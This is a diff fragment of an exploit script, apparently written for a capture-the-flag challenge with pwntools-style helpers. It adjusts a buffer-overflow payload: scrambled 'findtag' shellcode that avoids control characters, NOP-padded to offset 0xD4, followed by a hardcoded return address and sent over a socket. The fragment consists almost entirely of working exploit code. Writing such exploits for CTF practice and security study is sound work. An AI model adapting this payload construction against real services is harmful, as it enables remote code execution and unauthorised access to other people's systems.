@@ -9,10 +9,10 @@ sock.recvuntil('Your output to my input? Do your best!\n')
 
 tag = random32()
 # Scramble it because it contains a newline
-shellcode = scramble(findtagsh(tag), avoid = '\x00\n')
+shellcode = scramble(findtagsh(tag), avoid = ''.join(chr(n) for n in range(32)))
 
 eip = 0x0804a080
-sock.send(flat(nop_pad(0xD4, shellcode), eip, '\n'))
+sock.send(flat(nop_pad(0xD4, shellcode, avoid = ''.join(chr(n) for n in range(32))), eip, '\n'))
 
 # This is not nececary if there is no leftovers from the exploit
 # and program cannot accidentally consume the tag while
